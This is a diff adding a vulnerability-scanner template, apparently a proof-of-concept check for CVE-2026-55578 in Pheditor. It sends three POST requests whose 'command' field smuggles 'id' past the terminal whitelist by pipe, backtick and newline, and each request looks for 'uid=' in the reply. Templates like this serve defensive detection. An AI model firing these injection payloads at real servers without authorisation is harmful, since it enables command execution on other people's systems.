@@ -1,0 +1,71 @@
+[info]
+author = "AVE"
+description = "检测 Pheditor 终端功能命令注入漏洞，通过管道符、反引号或换行符绕过 TERMINAL_COMMANDS 白名单执行任意系统命令"
+id = "POC-AVE-2026-0624"
+name = "CVE-2026-55578 PoC"
+severity = "high"
+tags = ["cve-2026-55578"]
+vuln_id = [
+    "CVE-2026-55578",
+    "AVE-2026-0624",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=terminal&command=help%20|%20id"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=terminal&command=echo%20%60id%60"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=terminal&command=help%0Aid"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
